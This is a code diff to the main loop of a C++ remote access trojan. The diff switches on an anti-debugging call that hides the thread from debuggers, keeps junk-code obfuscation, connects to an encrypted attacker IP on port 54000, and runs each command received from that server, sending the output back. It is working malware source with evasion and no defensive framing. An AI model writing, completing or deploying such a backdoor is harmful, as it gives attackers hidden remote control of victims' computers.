@@ -33,26 +33,21 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 	// or in the resolve_dynamically: resolve_dynamically<GetCurrentThread_t>(arrayToCStr(str_GetCurrentThread_encrypt));
 
 #ifndef _DEBUG
-	//GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(str_GetCurrentThread);
-	//resolve_dynamically<NtSetInformationThread_t>(str_NtSetInformationThread, str_ntdll)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
-#endif // _DEBUG
+	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(str_GetCurrentThread);
+	resolve_dynamically<NtSetInformationThread_t>(str_NtSetInformationThread, str_ntdll)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+#endif
 
 	suspicious_junk_3();
 
 	TCPClient* conn = new TCPClient(&str_ip, 54000);
 	conn->start_connection();
 
-	std::string commandLine = "";
 	while (true)
 	{
-		commandLine = string_decrypt(str_cmd);
-
 		suspicious_junk_1();
-
-		// recv command from server
-		commandLine.append(conn->recv_data());
-
-		std::string result = exec(commandLine);		
+		
+		// recv command from server and execute it
+		std::string result = exec(str_cmd, conn->recv_data());
 
 		junk();
 
@@ -60,7 +55,6 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 		conn->send_data(result);
 	}
 
-	wipeStr(commandLine);
 	delete conn;
 
 	return 0;
